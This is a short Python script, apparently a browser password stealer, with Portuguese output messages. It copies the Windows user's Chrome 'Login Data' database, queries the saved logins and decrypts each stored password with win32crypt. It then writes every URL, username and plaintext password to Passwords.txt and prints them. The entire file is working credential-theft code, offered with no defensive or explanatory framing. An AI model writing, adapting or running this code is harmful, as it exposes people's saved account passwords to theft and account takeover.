import os
import sqlite3
import win32crypt
from os import getenv
import time

os.system('copy "C:\\Users\\'+getenv("username")+'\\Appdata\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" .')
conn_chrome = sqlite3.connect('Login Data')
db = conn_chrome.cursor()

db.execute("SELECT origin_url, action_url, username_value, password_value from logins")

password_L = open("Passwords.txt", "w")

for query in db.fetchall():
	passw = win32crypt.CryptUnprotectData(query[3])[1]
	passwd = (str(passw)).split("'")
	password_L.writelines("\nURL[1]~: " + query[0] + "\nURL[2]~: " + query[1] + "\nUsername[~: " + query[2] + "\nPassword[~: " + passwd[0] + "\n")
	
password_L.close()
print ("[+] Todas as senhas foram salvas em Passwords.txt")
passp = open("Passwords.txt", "r")
for senhas in passp:
	print senhas
